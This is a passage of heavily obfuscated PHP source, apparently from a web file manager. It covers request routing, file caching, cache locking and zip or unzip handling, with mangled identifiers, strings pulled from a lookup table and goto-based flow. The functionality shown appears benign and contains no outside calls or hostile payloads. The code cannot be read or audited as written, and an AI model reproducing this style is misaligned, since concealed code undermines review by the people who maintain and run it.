=== 0 ? $ÖÂ©‘À[1] : $×ö¡»õ·[8] . $ÖÂ©‘À[1]; $ÉË¨¸Â = $ÖÂ©‘À[2]; } else { $ù…›Â‰› = null; $İ¥İŞ«ö = strpos($ÖÂ©‘À[0], $×ö¡»õ·[8]) === 0 ? $ÖÂ©‘À[0] : $×ö¡»õ·[8] . $ÖÂ©‘À[0]; $ÉË¨¸Â = $ÖÂ©‘À[1]; } array_push(self::$maps, $ù…›Â‰›); array_push(self::$routes, $İ¥İŞ«ö); array_push(self::$methods, strtoupper($ÉŠƒ›Õ­)); array_push(self::$callbacks, $ÉË¨¸Â); } public static function error($©‘¼µˆ¼) { self::$errorCallback = $©‘¼µˆ¼; } public static function haltOnMatch($í¬Ëñı = true) { self::$halts = $í¬Ëñı; } public static function dispatch() { $‘¯®·– =& $_SERVER[øşô´çË]; $‰™úä¢Ğ = parse_url($_SERVER[$‘¯®·–[1912]], PHP_URL_PATH); $·¸õ§ñî = $_SERVER[$‘¯®·–[171]]; $§ê™®×Ä = array_keys(static::$patterns); $ƒğØ–» = array_values(static::$patterns); $éâ§®¾Ÿ = !1; self::$routes = preg_replace($‘¯®·–[1462], $‘¯®·–[8], self::$routes); if (in_array($‰™úä¢Ğ, self::$routes)) { $œ…±ŒŸ = array_keys(self::$routes, $‰™úä¢Ğ); foreach ($œ…±ŒŸ as $–‘ôŞ×Ä) { if (self::$methods[$–‘ôŞ×Ä] == $·¸õ§ñî || self::$methods[$–‘ôŞ×Ä] == $‘¯®·–[1913] || in_array($·¸õ§ñî, self::$maps[$–‘ôŞ×Ä])) { $éâ§®¾Ÿ = !0; if (!is_object(self::$callbacks[$–‘ôŞ×Ä])) { $Ø’†¿ºé = explode($‘¯®·–[8], self::$callbacks[$–‘ôŞ×Ä]); $£˜ÙÒô = end($Ø’†¿ºé); $ÈŸÌÂ¿º = explode($‘¯®·–[1394], $£˜ÙÒô); $©¯ì¹÷ = new $ÈŸÌÂ¿º[0](); $©¯ì¹÷->{$ÈŸÌÂ¿º[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$–‘ôŞ×Ä]); if (self::$halts) { return; } } } } } else { $òã½»’š = 0; foreach (self::$routes as $–‘ôŞ×Ä) { if (strpos($–‘ôŞ×Ä, $‘¯®·–[4]) !== !1) { $–‘ôŞ×Ä = str_replace($§ê™®×Ä, $ƒğØ–», $–‘ôŞ×Ä); } if (preg_match($‘¯®·–[1914] . $–‘ôŞ×Ä . $‘¯®·–[1915], $‰™úä¢Ğ, $Çùãà™ö)) { if (self::$methods[$òã½»’š] == $·¸õ§ñî || self::$methods[$òã½»’š] == $‘¯®·–[1913] || !empty(self::$maps[$òã½»’š]) && in_array($·¸õ§ñî, self::$maps[$òã½»’š])) { $éâ§®¾Ÿ = !0; array_shift($Çùãà™ö); if (!is_object(self::$callbacks[$òã½»’š])) { $Ø’†¿ºé = explode($‘¯®·–[8], self::$callbacks[$òã½»’š]); $£˜ÙÒô = end($Ø’†¿ºé); $ÈŸÌÂ¿º = explode($‘¯®·–[1394], $£˜ÙÒô); $©¯ì¹÷ = new $ÈŸÌÂ¿º[0](); if (!method_exists($©¯ì¹÷, $ÈŸÌÂ¿º[1])) { echo $‘¯®·–[1916]; } else { call_user_func_array(array($©¯ì¹÷, $ÈŸÌÂ¿º[1]), $Çùãà™ö); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$òã½»’š], $Çùãà™ö); if (self::$halts) { return; } } } } $òã½»’š++; } } if ($éâ§®¾Ÿ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $‚ô»Üáï =& $_SERVER[øşô´çË]; header($_SERVER[$‚ô»Üáï[1917]] . $‚ô»Üáï[1918]); echo $‚ô»Üáï[1919]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$‘¯®·–[1912]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto cñƒÈÍùÀã; aø Œ÷’†‹: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($‡”œŠØò, $şåˆ…ÚÊ) { $ûÆ†É =& $_SERVER[øşô´çË]; $this->cachePath = $‡”œŠØò[$ûÆ†É[97]]; $this->prefix = $ûÆ†É[993]; $this->cacheTime = $şåˆ…ÚÊ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Ú­õèşâ) { $…ãõÈéŒ =& $_SERVER[øşô´çË]; $Ú­õèşâ = str_replace(array($…ãõÈéŒ[994], $…ãõÈéŒ[107], $…ãõÈéŒ[86]), $…ãõÈéŒ[995], $Ú­õèşâ); return $this->cachePath . $…ãõÈéŒ[996] . $Ú­õèşâ . $…ãõÈéŒ[997]; } public function set($ª˜áû, $¸à¯ÕÖœ, $í×ò„Âá = false) { $í×ò„Âá = $í×ò„Âá ? $í×ò„Âá : $this->cacheTime; $ï­ÄÂŸå = $this->getFile($ª˜áû); if (file_put_contents($ï­ÄÂŸå, $this->prefix . $¸à¯ÕÖœ, LOCK_EX)) { @touch($ï­ÄÂŸå, intval(time() + $í×ò„Âá)); clearstatcache(); return !0; } @unlink($ï­ÄÂŸå); return !1; } public function get($Ø½Öòæ‹) { $°£Ù‘› = $this->getFile($Ø½Öòæ‹); if (file_exists($°£Ù‘›) && filemtime($°£Ù‘›) < time()) { @unlink($°£Ù‘›); return !1; } $ÊòŠÕÕ = @file_get_contents($°£Ù‘›); return substr($ÊòŠÕÕ, strlen($this->prefix)); } public function remove($ÆØ¬¯¾†) { $£•´Ì¤Å = $this->getFile($ÆØ¬¯¾†); return @unlink($£•´Ì¤Å); } public function deleteAll() { $ÑŸŒ¶ÎÜ =& $_SERVER[øşô´çË]; $ÙÌÎ¢î = scandir($this->cachePath); foreach ($ÙÌÎ¢î as $™´×Âğé) { $¼Šì£İ« = $this->cachePath . $™´×Âğé; if (strpos($¼Šì£İ«, $ÑŸŒ¶ÎÜ[997]) && strpos($¼Šì£İ«, $ÑŸŒ¶ÎÜ[998])) { @unlink($¼Šì£İ«); } } } public function clearTimeout() { $²´›é =& $_SERVER[øşô´çË]; $ë¬Å”Â‘ = scandir($this->cachePath); foreach ($ë¬Å”Â‘ as $íè¼¥Êº) { $ÍŠŞ¼Ş = $this->cachePath . $íè¼¥Êº; if (strpos($ÍŠŞ¼Ş, $²´›é[997]) && strpos($ÍŠŞ¼Ş, $²´›é[998]) && filemtime($ÍŠŞ¼Ş) < time()) { @unlink($ÍŠŞ¼Ş); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $”«ª€¿Ï =& $_SERVER[øşô´çË]; if (self::$handle) { return self::$handle; } $íšê°Ø¿ = $GLOBALS[$”«ª€¿Ï[6]][$”«ª€¿Ï[433]]; self::$timeout = $íšê°Ø¿[$”«ª€¿Ï[999]] ? $íšê°Ø¿[$”«ª€¿Ï[999]] : 10; $Üá¦¤Ôß = _get($GLOBALS[$”«ª€¿Ï[6]], $”«ª€¿Ï[1000]); $ó¼›‹Ôñ = $íšê°Ø¿[$”«ª€¿Ï[982]] ? $íšê°Ø¿[$”«ª€¿Ï[982]] : $”«ª€¿Ï[240]; if ($ó¼›‹Ôñ == $”«ª€¿Ï[31] && $Üá¦¤Ôß == $”«ª€¿Ï[23]) { $ó¼›‹Ôñ = $”«ª€¿Ï[240]; } switch ($ó¼›‹Ôñ) { case $”«ª€¿Ï[985]: self::$handle = new CacheLockRedis(); break; case $”«ª€¿Ï[986]: self::$handle = new CacheLockMemcached(); break; case $”«ª€¿Ï[31]: self::$handle = new CacheLockDatabase(); break; case $”«ª€¿Ï[240]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($”«ª€¿Ï[1001], $”«ª€¿Ï[1002]); } return self::$handle; } private static function key($™äÔ‰Ë) { return $_SERVER[øşô´çË][1003] . Cache::key($™äÔ‰Ë); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Æ·’‡«¸ = '') { self::$errorMsg = $Æ·’‡«¸; } public static function lockGlobal($ìÍÌ™ôë, $ôöÄ¨¤ƒ) { return self::lock($ìÍÌ™ôë, $ôöÄ¨¤ƒ, !0); } public static function lock($Ÿ†¡·˜À, $Ëõôã« = false, $®½ùÛ€ = false) { $æ¼§ºâŒ =& $_SERVER[øşô´çË]; $·®×Ú³´ = self::init(); $‚šúÉµÃ = self::key($Ÿ†¡·˜À); $Ëõôã« = $Ëõôã« ? $Ëõôã« : self::$timeout; $¥Öˆ½¼¥ = timeFloat(); if (_get($GLOBALS, $æ¼§ºâŒ[1004], !1)) { if (!$·®×Ú³´->lock($‚šúÉµÃ, 0.2)) { die; } return !0; } $æ¯çÕÓ = $·®×Ú³´->lock($‚šúÉµÃ, $Ëõôã«); $£æ©Ÿ½× = timeFloat(); if (!$æ¯çÕÓ) { $«ó‚Ñù‰ = "\x6c\x6f\x63\x6b\x20\145\x72\x72\x6f\x72\73\x6b\145\171\x3d{$Ÿ†¡·˜À}\x3b\x74\151\155\145\x3d{$Ëõôã«}\x3b" . self::$errorMsg . $æ¼§ºâŒ[84] . get_caller_msg(); $¶ø½ÕÜê = LNG($æ¼§ºâŒ[1005]) . "\x28{$Ëõôã«}\163\51\x2e" . LNG($æ¼§ºâŒ[1006]); $¶ø½ÕÜê .= $æ¼§ºâŒ[1007]; if (is_string(self::$errorMsg) && self::$errorMsg) { $¶ø½ÕÜê = $¶ø½ÕÜê . $æ¼§ºâŒ[1008] . self::$errorMsg; } write_log($æ¼§ºâŒ[1009] . sprintf($æ¼§ºâŒ[1010], timeFloat() - $¥Öˆ½¼¥) . $æ¼§ºâŒ[1011] . $«ó‚Ñù‰ . $æ¼§ºâŒ[1012] . json_encode(error_get_last()), $æ¼§ºâŒ[1002]); show_json($¶ø½ÕÜê, !1); } if (!$®½ùÛ€) { self::$lockItem[$‚šúÉµÃ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $œ™áÙÑè = number_format(timeFloat() - $£æ©Ÿ½×, 3); write_log($æ¼§ºâŒ[1013] . $Ÿ†¡·˜À . $æ¼§ºâŒ[1014] . $œ™áÙÑè, $æ¼§ºâŒ[1002]); } return $æ¯çÕÓ; } public static function lockGet($”…«Ï³) { $Šî ˜¿Ò = self::key($”…«Ï³); if (self::$lockItem[$Šî ˜¿Ò]) { return self::$lockItem[$Šî ˜¿Ò]; } return self::init()->lockGet($Šî ˜¿Ò); } public static function unlock($¬–ùãç‘) { $ö²×ÀıÃ =& $_SERVER[øşô´çË]; $íÆ›š¡ = self::key($¬–ùãç‘); self::$lockItem[$íÆ›š¡] = null; self::init()->unlock($íÆ›š¡); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ö²×ÀıÃ[1015] . $¬–ùãç‘, $ö²×ÀıÃ[1002]); } return; } public static function unlockRuntime() { $‡Ê”¬ËÖ =& $_SERVER[øşô´çË]; $äÊëÍ²» = self::init(); $£ŒÄö½ = !1; foreach (self::$lockItem as $Ş¤§Ñ  => $óÍøò‡È) { if (!$óÍøò‡È) { continue; } $äÊëÍ²»->unlock($Ş¤§Ñ ); if (!$£ŒÄö½) { $£ŒÄö½ = !0; write_log($‡Ê”¬ËÖ[1016] . $Ş¤§Ñ  . $‡Ê”¬ËÖ[84] . get_caller_msg(), $‡Ê”¬ËÖ[1002]); continue; } write_log($‡Ê”¬ËÖ[1016] . $Ş¤§Ñ , $‡Ê”¬ËÖ[1002]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Îœ¯õµ£ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($‡Ê”¬ËÖ[1017] . $Îœ¯õµ£ . $‡Ê”¬ËÖ[1018] . ACTION, $‡Ê”¬ËÖ[1002]); } } public static function fileLock($ø¿Ó³¢) { $”¡ô¤“ =& $_SERVER[øşô´çË]; if (!$GLOBALS[$”¡ô¤“[1019]]) { $GLOBALS[$”¡ô¤“[1019]] = array(); } $GLOBALS[$”¡ô¤“[1019]][$ø¿Ó³¢] = !1; $Éóßœ×¹ = fopen(DATA_PATH . $ø¿Ó³¢ . $”¡ô¤“[1020], $”¡ô¤“[1021]); if (!$Éóßœ×¹) { return !1; } $GLOBALS[$”¡ô¤“[1019]][$ø¿Ó³¢] = $Éóßœ×¹; if (flock($Éóßœ×¹, LOCK_EX)) { return !0; } self::unlock($ø¿Ó³¢); show_json($”¡ô¤“[1022], !1); return !1; } public static function fileUnlock($ÄÕŸÒ½®) { $Œºí·¬  =& $_SERVER[øşô´çË]; $¢‰ÛÃœ = $GLOBALS[$Œºí·¬ [1019]][$ÄÕŸÒ½®]; if (!$¢‰ÛÃœ) { return; } $GLOBALS[$Œºí·¬ [1019]][$ÄÕŸÒ½®] = !1; flock($¢‰ÛÃœ, LOCK_UN); fclose($¢‰ÛÃœ); } public static function fileUnlockAll() { $ÒèËÂ¼· =& $_SERVER[øşô´çË]; if (!isset($GLOBALS[$ÒèËÂ¼·[1019]]) || !$GLOBALS[$ÒèËÂ¼·[1019]]) { return; } foreach ($GLOBALS[$ÒèËÂ¼·[1019]] as $ÜÀÓØµ× => $Š¬¬—Ïœ) { if (!$Š¬¬—Ïœ) { continue; } $GLOBALS[$ÒèËÂ¼·[1019]][$ÜÀÓØµ×] = !1; flock($Š¬¬—Ïœ, LOCK_UN); fclose($Š¬¬—Ïœ); } $GLOBALS[$ÒèËÂ¼·[1019]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto EÖÍâÔÖ°¸; A’Öô‚øŸé: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ñøÚäü; if ($ñøÚäü) { return $ñøÚäü; } $æŠñ‚  = IO::init($_SERVER[øşô´çË][8]); return $æŠñ‚ ; } private static function iconvSystem($Ñ‰¾‚Ö÷) { return self::local()->iconvSystem($Ñ‰¾‚Ö÷); } private static function iconvApp($Ö×ùË¯Ë) { return self::local()->iconvApp($Ö×ùË¯Ë); } public static function zipFolder($—‘†úªë, $Ÿû¼ü—é = "\x7a\151\160", $ÄÛÓ¦÷ = '', $¦Ë¾–ñ = REPEAT_RENAME) { $áû Òªì =& $_SERVER[øşô´çË]; $ÊÊ÷÷¾û = IO::listPath($—‘†úªë); if (!$ÊÊ÷÷¾û) { return !1; } $ÊÊ÷÷¾û = array_merge($ÊÊ÷÷¾û[$áû Òªì[95]], $ÊÊ÷÷¾û[$áû Òªì[96]]); return self::zip($ÊÊ÷÷¾û, $Ÿû¼ü—é, $ÄÛÓ¦÷, $¦Ë¾–ñ); } public static function zip($ˆãøøÉÊ, $ŒÄ¾…¿Ü = "\x7a\151\x70", $½¯ø¸Æï = '', $ŠÜÌèĞ  = REPEAT_RENAME) { $×ôÍ÷Õ =& $_SERVER[øşô´çË]; if (is_string($ˆãøøÉÊ) && $ˆãøøÉÊ) { $ˆãøøÉÊ = array(array($×ôÍ÷Õ[97] => $ˆãøøÉÊ)); } $Š¸èŞñö = self::init($ˆãøøÉÊ[0][$×ôÍ÷Õ[97]]); $Âãû†ş = self::info($ˆãøøÉÊ[0][$×ôÍ÷Õ[97]]); $×æ»¢é = $×ôÍ÷Õ[12]; $İŒÚÑ˜ = $×ôÍ÷Õ[12]; $‡‚…á„æ = $×ôÍ÷Õ[12]; if ($½¯ø¸Æï && substr($½¯ø¸Æï, -1, 1) != $×ôÍ÷Õ[8]) { $İŒÚÑ˜ = get_path_father($½¯ø¸Æï); $‡‚…á„æ = get_path_this($½¯ø¸Æï); } else { $İŒÚÑ˜ = self::pathFather($Âãû†ş[$×ôÍ÷Õ[97]]); $‡‚…á„æ = $Âãû†ş[$×ôÍ÷Õ[42]] . $×ôÍ÷Õ[10] . $ŒÄ¾…¿Ü; if (count($ˆãøøÉÊ) > 1) { $ÁŠş‚†€ = IO::info($İŒÚÑ˜); $‡‚…á„æ = $ÁŠş‚†€[$×ôÍ÷Õ[42]] . $×ôÍ÷Õ[10] . $ŒÄ¾…¿Ü; } if ($½¯ø¸Æï) { $İŒÚÑ˜ = $½¯ø¸Æï; } } if ($Š¸èŞñö->getType() == $×ôÍ÷Õ[116]) { $—î½ÕÁ = self::init($İŒÚÑ˜); $«²¢¥›› = $—î½ÕÁ->getType() == $×ôÍ÷Õ[116] ? $İŒÚÑ˜ : get_path_father($Š¸èŞñö->path); $«²¢¥›› = IO::getPathInner($«²¢¥››); $«²¢¥›› = rtrim($«²¢¥››, $×ôÍ÷Õ[8]) . $×ôÍ÷Õ[8]; mk_dir($«²¢¥››); } else { $×æ»¢é = TEMP_FILES . $×ôÍ÷Õ[1368] . time() . rand_string(8) . $×ôÍ÷Õ[8]; mk_dir($×æ»¢é); file_put_contents($×æ»¢é . $×ôÍ÷Õ[1369], $×ôÍ÷Õ[12]); $«²¢¥›› = $×æ»¢é; } $äûñ®â³ = IO::info($«²¢¥››); if (!$äûñ®â³ || !$äûñ®â³[$×ôÍ÷Õ[243]]) { show_json(LNG($×ôÍ÷Õ[1370]), !1); } $®„µÉ´Ò = self::zipFileList($ˆãøøÉÊ, $×æ»¢é); foreach ($®„µÉ´Ò as $²Ï‰×åÓ => $±ÎÑİ) { $®„µÉ´Ò[$²Ï‰×åÓ] = self::iconvSystem($±ÎÑİ); } $½¥¸™±ò = get_filename_auto($«²¢¥›› . $‡‚…á„æ, $×ôÍ÷Õ[12], $ŠÜÌèĞ ); KodArchive::create(self::iconvSystem($½¥¸™±ò), $®„µÉ´Ò); if (!IO::exist($½¥¸™±ò)) { if ($×æ»¢é) { del_dir($×æ»¢é); } write_log($×ôÍ÷Õ[1371] . $½¥¸™±ò, $×ôÍ÷Õ[397]); show_json(LNG($×ôÍ÷Õ[1372]), !1); } if (!$×æ»¢é) { return $½¥¸™±ò; } $›üÙ¡å = self::move($½¥¸™±ò, $İŒÚÑ˜, $ŠÜÌèĞ ); if ($×æ»¢é) { del_dir($×æ»¢é); } if (!$½¥¸™±ò) { write_log($×ôÍ÷Õ[1373] . $½¥¸™±ò . $×ôÍ÷Õ[1374] . $İŒÚÑ˜, $×ôÍ÷Õ[397]); show_json(LNG($×ôÍ÷Õ[1372]), !1); } return $›üÙ¡å; } public static function unzip($Å×Ç„€, $‹ö–Å, $©ÕÃ»¸Ç = "\x2d\61", $Õ‘¾†É = "\162\145\x70\x6c\141\143\x65") { $ƒ÷õæøÂ =& $_SERVER[øşô´çË]; $¸Ùğ‡¦‘ = parent::info($Å×Ç„€); if (!$¸Ùğ‡¦‘) { show_json(LNG($ƒ÷õæøÂ[1375]), !1); } $½¾‹ÅÆø = IO::infoFullSimple($‹ö–Å); if (!$½¾‹ÅÆø) { $‹ö–Å = IO::mkdir($‹ö–Å); } if (isset($½¾‹ÅÆø[$ƒ÷õæøÂ[201]]) && trim($½¾‹ÅÆø[$ƒ÷õæøÂ[97]], $ƒ÷õæøÂ[8]) != trim($‹ö–Å, $ƒ÷õæøÂ[8])) { $š¡û¿Ø = KodIO::make($½¾‹ÅÆø[$ƒ÷õæøÂ[200]]); $ØœŒ˜ã– = IO::fileNameAuto($š¡û¿Ø, $½¾‹ÅÆø[$ƒ÷õæøÂ[42]], REPEAT_RENAME_FOLDER, !0); $‹ö–Å = IO::mkdir($š¡û¿Ø . $ØœŒ˜ã–); } $©ÕÃ»¸Ç = $©ÕÃ»¸Ç && $©ÕÃ»¸Ç != $ƒ÷õæøÂ[1376] ? @json_decode($©ÕÃ»¸Ç, !0) : -1; $š«ÜÕ¢ä = self::unzipPart($Å×Ç„€, $©ÕÃ»¸Ç); if (!$š«ÜÕ¢ä || !IO::exist($š«ÜÕ¢ä[$ƒ÷õæøÂ[240]])) { show_json(LNG($ƒ÷õæøÂ[115]), !1); } $Ášé = $š«ÜÕ¢ä[$ƒ÷õæøÂ[1377]][count($š«ÜÕ¢ä[$ƒ÷õæøÂ[1377]]) - 1]; if ($Ášé[$ƒ÷õæøÂ[1305]] == -1 || substr($Ášé[$ƒ÷õæøÂ[42]], -1, 1) == $ƒ÷õæøÂ[8]) { $×Ş¡Îå³ = $š«ÜÕ¢ä[$ƒ÷õæøÂ[1378]] . rand_string(10) . $ƒ÷õæøÂ[8]; mk_dir($×Ş¡Îå³); $Ùñ¶ƒöİ = count($š«ÜÕ¢ä[$ƒ÷õæøÂ[1377]]) == 1 ? IO::ext($Å×Ç„€) : get_path_ext($š«ÜÕ¢ä[$ƒ÷õæøÂ[240]]); $¢ĞÂÙƒ = KodArchive::extract(self::iconvSystem($š«ÜÕ¢ä[$ƒ÷õæøÂ[240]]), $×Ş¡Îå³, $Ášé[$ƒ÷õæøÂ[1305]], $ØœŒ˜ã–, $Ùñ¶ƒöİ); self::unzipErrorCheck($¢ĞÂÙƒ, array($ƒ÷õæøÂ[1379], $Å×Ç„€, $Ùñ¶ƒöİ, $‹ö–Å, $š«ÜÕ¢ä)); Hook::trigger($ƒ÷õæøÂ[1380], $×Ş¡Îå³); recursion_dir($×Ş¡Îå³, $Å€Åô¤¶, $ª‚ş¿¥†, 0); $‹¬õ³ãé = array_merge($Å€Åô¤¶, $ª‚ş¿¥†); $¤ôğ×Ó¸ = array(); foreach ($‹¬õ³ãé as $È«šîĞ³) { $Í¬×¨¹¸ = IO::move(self::iconvApp($È«šîĞ³), $‹ö–Å, $Õ‘¾†É); if ($Í¬×¨¹¸) { $¤ôğ×Ó¸[] = $Í¬×¨¹¸; } } del_dir($×Ş¡Îå³); } else { $Í¬×¨¹¸ = IO::move($š«ÜÕ¢ä[$ƒ÷õæøÂ[240]], $‹ö–Å, $Õ‘¾†É, get_path_this($Ášé[$ƒ÷õæøÂ[42]])); if ($Í¬×¨¹¸) { $¤ôğ×Ó¸[] = $Í¬×¨¹¸; } } return $¤ôğ×Ó¸ ? $¤ôğ×Ó¸ : !1; } public static function unzipList($ÆòŒ€İï) { $Ã¼”¤ßÜ =& $_SERVER[øşô´çË]; $ğµĞÙû² = isset($ÆòŒ€İï[$Ã¼”¤ßÜ[1381]]) ? $ÆòŒ€İï[$Ã¼”¤ßÜ[1381]] : !1; $Ñ§…€Îõ = isset($ÆòŒ€İï[$Ã¼”¤ßÜ[1305]]) ? @json_decode($ÆòŒ€İï[$Ã¼”¤ßÜ[1305]], !0) : -1; $ìË¢èóÅ = self::unzipPart($ÆòŒ€İï[$Ã¼”¤ßÜ[97]], $Ñ§…€Îõ); if (!$ìË¢èóÅ || !IO::exist($ìË¢èóÅ[$Ã¼”¤ßÜ[240]])) { show_json(LNG($Ã¼”¤ßÜ[115]), !1); } $¢¦á˜• = $ìË¢èóÅ[$Ã¼”¤ßÜ[1377]][count($ìË¢èóÅ[$Ã¼”¤ßÜ[1377]]) - 1]; $–©Üá¦á = in_array(IO::ext($ìË¢èóÅ[$Ã¼”¤ßÜ[240]]), array($Ã¼”¤ßÜ[397], $Ã¼”¤ßÜ[1382], $Ã¼”¤ßÜ[1383], $Ã¼”¤ßÜ[1384], $Ã¼”¤ßÜ[1385], $Ã¼”¤ßÜ[1386])); if (!$ğµĞÙû² && ($¢¦á˜•[$Ã¼”¤ßÜ[1305]] == -1 || $–©Üá¦á)) { $÷’±ğó¹ = $ìË¢èóÅ[$Ã¼”¤ßÜ[1378]] . get_path_this($ìË¢èóÅ[$Ã¼”¤ßÜ[240]]) . $Ã¼”¤ßÜ[962]; if (!IO::exist($÷’±ğó¹)) { $¥ÃË™±Á = $¢¦á˜•[$Ã¼”¤ßÜ[1305]] == -1 ? get_path_ext(IO::pathThis($ÆòŒ€İï[$Ã¼”¤ßÜ[97]])) : get_path_ext($ìË¢èóÅ[$Ã¼”¤ßÜ[240]]); $´¬ú•³¾ = KodArchive::listContent(self::iconvSystem($ìË¢èóÅ[$Ã¼”¤ßÜ[240]]), !0, $¥ÃË™±Á); self::unzipErrorCheck($´¬ú•³¾, array($Ã¼”¤ßÜ[1387], $ÆòŒ€İï, $ìË¢èóÅ)); @file_put_contents($÷’±ğó¹, json_encode($´¬ú•³¾[$Ã¼”¤ßÜ[1388]])); } return @json_decode(IO::getContent($÷’±ğó¹), !0); } IO::fileOut($ìË¢èóÅ[$Ã¼”¤ßÜ[240]], $ğµĞÙû², get_path_this($¢¦á˜•[$Ã¼”¤ßÜ[42]])); die; } private static function zipFileList($ëâÜşÀù, $âî–Œ = false) { $¯ÈÅªÎ½ =& $_SERVER[øşô´çË]; $óü¼‡şâ = array(); foreach ($ëâÜşÀù as $ÅÓñ¶èñ) { $ÖåÌ·Òé = $ÅÓñ¶èñ[$¯ÈÅªÎ½[97]]; if ($âî–Œ) { $ÖåÌ·Òé = self::copy($ÅÓñ¶èñ[$¯ÈÅªÎ½[97]], $âî–Œ, $¯ÈÅªÎ½[929]); } else { $¼Îáë¾ë = self::init($ÅÓñ¶èñ[$¯ÈÅªÎ½[97]]); if ($¼Îáë¾ë->getType() == $¯ÈÅªÎ½[116]) { $ÖåÌ·Òé = $¼Îáë¾ë->path; } } if ($ÖåÌ·Òé && self::local()->exist($ÖåÌ·Òé)) { $óü¼‡şâ[$ÅÓñ¶èñ[$¯ÈÅªÎ½[97]]] = $ÖåÌ·Òé; } } if (!empty($óü¼‡şâ)) { return array_values($óü¼‡şâ); } show_json(LNG($¯ÈÅªÎ½[1347]), !1); } private static function localFilePath($Ü©™“§Ò) { $îªã­°Ö =& $_SERVER[øşô´çË]; $¤óµúØ = KodIO::parse($Ü©™“§Ò); if ($¤óµúØ[$îªã­°Ö[43]] == KodIO::KOD_SOURCE) { $—ñ——°× = Model($îªã­°Ö[935])->fileInfoGet(KodIO::sourceID($Ü©™“§Ò)); if (!$—ñ——°×[$îªã­°Ö[97]]) { show_json($îªã­°Ö[1389], !1); } $Ü©™“§Ò = $—ñ——°×[$îªã­°Ö[97]]; } $Ñ’á©£ = self::init($Ü©™“§Ò); if ($Ñ’á©£->pathParse[$îªã­°Ö[1333]]) { $Ü©™“§Ò = $Ñ’á©£->pathParse[$îªã­°Ö[1333]]; $Ñ’á©£ = self::init($Ü©™“§Ò); } $ªİşÚ¶Ã = $Ñ’á©£->getType(); if ($ªİşÚ¶Ã == $îªã­°Ö[116] || $ªİşÚ¶Ã == $îªã­°Ö[1390]) { if (!$Ñ’á©£->exist($Ñ’á©£->path)) { show_json(LNG($îªã­°Ö[115]), !1); } return $Ñ’á©£->path; } return !1; } public static function unzipPart($…ÄÜÚß, $…€ÍÂßÉ = -1) { $ è‰¿ÕÌ =& $_SERVER[øşô´çË]; $¸ğœòÉÈ = IO::pathThis($…ÄÜÚß); if (!$…€ÍÂßÉ || $…€ÍÂßÉ == -1) { $µ­ı÷é” = array(array($ è‰¿ÕÌ[42] => $¸ğœòÉÈ, $ è‰¿ÕÌ[1305] => -1)); $µ­ı÷é”[0][$ è‰¿ÕÌ[1391]] = $µ­ı÷é”[0][$ è‰¿ÕÌ[42]]; } else { if (is_array($…€ÍÂßÉ)) { $µ­ı÷é” = $…€ÍÂßÉ; $„›İ–ùÜ = count($µ­ı÷é”) - 1; for ($¾Ô‰­ş¡ = 0; $¾Ô‰­ş¡ <= $„›İ–ùÜ; $¾Ô‰­ş¡++) { $Å¾€Ğ¥° = $µ­ı÷é”[$¾Ô‰­ş¡]; $ÛØ™ã ‰ = get_path_this($Å¾€Ğ¥°[$ è‰¿ÕÌ[42]]) . (checkExtSafe($Å¾€Ğ¥°[$ è‰¿ÕÌ[42]]) ? $ è‰¿ÕÌ[12] : $ è‰¿ÕÌ[1392]); $µ­ı÷é”[$¾Ô‰­ş¡][$ è‰¿ÕÌ[1391]] = $ è‰¿ÕÌ[1393] . intval($Å¾€Ğ¥°[$ è‰¿ÕÌ[1305]]) . $ è‰¿ÕÌ[485] . $ÛØ™ã ‰; if ($¾Ô‰­ş¡ == 0) { continue; } $µ­ı÷é”[$¾Ô‰­ş¡][$ è‰¿ÕÌ[1391]] = $µ­ı÷é”[$¾Ô‰­ş¡ - 1][$ è‰¿ÕÌ[1391]] . $ è‰¿ÕÌ[1394] . $µ­ı÷é”[$¾Ô‰­ş¡][$ è‰¿ÕÌ[1391]]; } } } if (!is_array($µ­ı÷é”) || count($µ­ı÷é”) == 0) { return !1; } $ñ¹Æº¦Ÿ = $µ­ı÷é”[count($µ­ı÷é”) - 1]; if (!IO::exist($…ÄÜÚß)) { return !1; } $·ò—†ëÒ = TEMP_FILES . $ è‰¿ÕÌ[1395] . kodIO::hashPathSafe($…ÄÜÚß) . $ è‰¿ÕÌ[8]; $Ø­¬¼üİ = $·ò—†ëÒ . $ñ¹Æº¦Ÿ[$ è‰¿ÕÌ[1391]]; mk_dir($·ò—†ëÒ); file_put_contents(TEMP_FILES . $ è‰¿ÕÌ[1369], $ è‰¿ÕÌ[12]); if (IO::exist($Ø­¬¼üİ)) { return array($ è‰¿ÕÌ[240] => $Ø­¬¼üİ, $ è‰¿ÕÌ[1377] => $µ­ı÷é”, $ è‰¿ÕÌ[1378] => $·ò—†ëÒ); } $ü„²Œöæ = self::localFilePath($…ÄÜÚß); if (!$ü„²Œöæ) { $ü„²Œöæ = $·ò—†ëÒ . $ è‰¿ÕÌ[1396]; if (!IO::exist($ü„²Œöæ)) { self::copy($…ÄÜÚß, $·ò—†ëÒ, !1, get_path_this($ü„²Œöæ)); } } if (!$ü„²Œöæ || !IO::exist($ü„²Œöæ)) { return !1; } if ($ñ¹Æº¦Ÿ[$ è‰¿ÕÌ[1305]] == -1) { return array($ è‰¿ÕÌ[240] => $ü„²Œöæ, $ è‰¿ÕÌ[1377] => $µ­ı÷é”, $ è‰¿ÕÌ[1378] => $·ò—†ëÒ); } $éÊ¡ÄÇ„ = $ü„²Œöæ; foreach ($µ­ı÷é” as $¾Ô‰­ş¡ => $Å¾€Ğ¥°) { if (!$Å¾€Ğ¥° || 